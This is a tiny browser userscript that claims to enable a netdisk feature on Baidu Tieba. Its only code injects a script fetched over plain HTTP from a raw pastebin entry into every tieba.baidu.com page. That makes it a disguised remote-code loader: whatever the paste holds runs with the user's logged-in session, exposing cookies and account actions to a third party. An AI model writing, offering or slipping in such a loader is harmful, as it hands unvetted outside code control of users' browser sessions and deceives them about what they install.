// ==UserScript==
// @name           百度贴吧网盘开启脚本
// @author         zyzsdy
// @description    此脚本仅供贴吧开启网盘功能使用，注意只能在主贴里使用。
// @version        1.1.0
// @namespace      namespace101
// @include        http://tieba.baidu.com/*
// ==/UserScript==
(function(){
var s=document.createElement("script");
s.src="http://paste.pound-python.org/raw/21128/";
document.body.appendChild(s);
})(); 